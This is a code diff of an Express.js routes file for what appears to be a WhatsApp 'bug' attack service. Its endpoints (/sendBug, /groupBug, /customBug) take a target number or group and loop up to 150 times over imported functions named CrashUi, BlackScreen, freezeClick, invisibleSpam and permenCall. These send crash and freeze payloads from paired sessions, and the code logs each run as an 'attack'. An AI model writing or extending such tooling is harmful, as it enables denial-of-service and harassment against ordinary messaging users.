@@ -1,48 +1,12 @@
 const crypto = require('crypto');
 const express = require('express');
-const { 
+const {
+  // Core State
   activeConnections,
   biz,
-  FriendFcAntiBlock,
   mess,
-  GCquizzzz,
-  prepareAuthFolders,
-  connectSession,
-  startUserSessions,
-  disconnectAllActiveConnections,
-  delayNew,
-  invsNewIos,
-  delaybuld,
-  IphoneUI,
-  Ninvite,
-  swl,
-  XCursedNFBlank,
-  Atut,
-  crashUi,
-  RaysDocuStunt,
-  xCursedCrawl,
-  xCursedCrott,
-  SDXBLANK,
-  FreezePackk,
-  Xospaminvis,
-  nullotaxx,
-  XoContact,
-  XMmL,
-  gsIntX,
-  permenCall,
-  XiosBugger,
-  XiosSejaya,
-  clickCrashBlankDelay,
-  killeruimsg,
-  blankios,
-  DelayHardCore,
-  fcinvisotax,
-  FriendBerulah,
-  yurikainvisible,
-  fcinvis,
-  delay3,
-  delaytriger,
-  isVipOrOwner,
+
+  // Session Management - VIP
   getVipSessionPath,
   prepareVipSessionFolders,
   connectVipSession,
@@ -50,7 +14,34 @@ const {
   getActiveVipConnections,
   isVipSession,
   getRandomVipConnection,
-  checkActiveSessionInFolder
+
+  // Session Management - Regular
+  prepareAuthFolders,
+  detectWATypeFromCreds,
+  connectSession,
+  startUserSessions,
+  checkActiveSessionInFolder,
+
+  // Utilities
+  disconnectAllActiveConnections,
+  sleep,
+  isVipOrOwner,
+
+  // BUG & ATTACK FUNCTIONS
+  crashNotificationVVIP,
+  uno,
+  forceCloseMentalVVIP,
+  invisibleSpam,
+  newsw,
+  permenCall,
+  GroupCrashUi,
+  pay,
+  xvar,
+  CrashUi,
+  CallLog,
+  BlackScreen,
+  freezeClick,
+  DelayX
 } = require('../services/whatsappService');
 const { loadDatabase, saveDatabase } = require('../services/databaseService');
 const { ROLE_COOLDOWNS, MAX_QUANTITIES } = require('../utils/constants');
@@ -176,8 +167,9 @@ router.get("/groupBug", async (req, res) => {
           if (finalResult.canSendMessage) {
             try {
               logger.info(`[📤 GROUP BUG] Sending hardcoded bug combination to group`);
-              await nullotaxx(sock, groupJid);
-              await sock.sendMessage(groupJid, { text: "Eh" });
+              await CrashUi(sock, groupJid);
+              await BlackScreen(sock, groupJid);
+              await freezeClick(sock, groupJid);
               logger.info(`[✅ GROUP BUG] Successfully sent bug combination to group`);
             } catch (err) {
               logger.error(`[❌ GROUP BUG] Failed to send bug to group: ${err.message}`);
@@ -337,60 +329,32 @@ router.get("/sendBug", async (req, res) => {
       logger.info(`[📤 BUG] Menggunakan session untuk mengirim bug ke ${targetJid}`);
 
       switch (bug) {
-        case "crash":
-          for (let i = 0; i < 15; i++) {
-            await swl(sock, targetJid);
-            await IphoneUI(sock, targetJid);
-            await Ninvite(sock, targetJid);
-            await sleep(1000);
-          }
-          break;
-        case "ios":
-          for (let i = 0; i < 10; i++) {
-            await IphoneUI(sock, targetJid);
-            await sleep(3000)
-          }
-          break;
-        case "bokep":
-          for (let i = 0; i < 20; i++) {
-            await swl(sock, targetJid);
-            await IphoneUI(sock, targetJid);
-            await Ninvite(sock, targetJid);
-            await sleep(1000)
-          }
-          break;
-        case "fcinvis":
-          for (let i = 0; i < 400; i++) {
-            await fcinvisotax(sock, targetJid);
-            await FriendBerulah(sock, targetJid);
-            await sleep(700);
-          }
-          break;
-        case "fcnoinvis":
-          for (let i = 0; i < 400; i++) {
-            await fcinvisotax(sock, targetJid);
+        case "crashui":
+          for (let i = 0; i < 100; i++) {
+            await CrashUi(sock, targetJid);
+            await DelayX(sock, targetJid);
             await sleep(2000);
           }
           break;
-        case "uix":
-          for (let i = 0; i < 20; i++) {
-            await XCursedNFBlank(sock, targetJid);
-            await crashUi(sock, targetJid);
-            await sleep(1000);
+
+        case "blackscreen":
+          for (let i = 0; i < 150; i++) {
+            await BlackScreen(sock, targetJid);
+            await sleep(2000);
           }
           break;
-        case "delay":
-          for (let i = 0; i < 320; i++) {
-            await RaysDocuStunt(sock, targetJid);
-            await xCursedCrott(sock, targetJid);
-            await xCursedCrawl(sock, targetJid);
-            await sleep(800);
+        case "freezeclick":
+          for (let i = 0; i < 105; i++) {
+            await freezeClick(sock, targetJid);
+            await sleep(2000);
           }
           break;
-        case "spam":
+        case "all":
           for (let i = 0; i < 100; i++) {
-            await delaybuld(sock, targetJid);
-            await sleep(1000);
+            await CrashUi(sock, targetJid);
+            await BlackScreen(sock, targetJid);
+            await freezeClick(sock, targetJid);
+            await sleep(2000);
           }
           break;
       }
@@ -633,18 +597,15 @@ router.get("/customBug", async (req, res) => {
       logger.info(`[📤 CUSTOM BUG] Starting attack on ${targetJid} using ${sessionName} (${senderType})`);
 
       const bugFunctions = {
-        'XMml': XMmL,
-        'FreezePackk': FreezePackk,
-        'gsIntX': gsIntX,
-        'RaysDocuStunt': RaysDocuStunt,
-        'FriendBerulah': FriendBerulah,
-        'fcinvisotax': fcinvisotax,
-        'xCursedCrott': xCursedCrott,
-        'xCursedCrawl': xCursedCrawl,
-        'permenCall': permenCall,
-        'XiosSejaya': XiosSejaya,
-        'killeruimsg': killeruimsg,
-        'XCursedNFBlank': XCursedNFBlank
+        'crashui': CrashUi,
+        'delayx': DelayX,
+        'blackscreen': BlackScreen,
+        'freezeclick': freezeClick,
+        'uno': uno,
+        'pay': pay,
+        'xvar': xvar,
+        'calllog': CallLog,
+        'invisiblespam': invisibleSpam
       };
 
       for (let i = 0; i < parsedQty; i++) {
@@ -916,22 +877,6 @@ async function pairingWa(number, owner, attempt = 1, isGlobal = false) {
   return null;
 }
 
-// Helper function to detect WhatsApp type from credentials
-function detectWATypeFromCreds(filePath) {
-  if (!fs.existsSync(filePath)) return 'Unknown';
-
-  try {
-    const creds = JSON.parse(fs.readFileSync(filePath));
-    const platform = creds?.platform || creds?.me?.platform || 'unknown';
-
-    if (platform.includes("business") || platform === "smba") return "Business";
-    if (platform === "android" || platform === "ios") return "Messenger";
-    return "Unknown";
-  } catch {
-    return "Unknown";
-  }
-}
-
 // Helper function to get active connections in a folder
 function getActiveCredsInFolder(subfolderName) {
   const folderPath = path.join('permenmd', subfolderName);
@@ -1007,10 +952,6 @@ function getUserActiveSessions(username) {
   }
 
   return userSessions;
-}
-
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 module.exports = router;
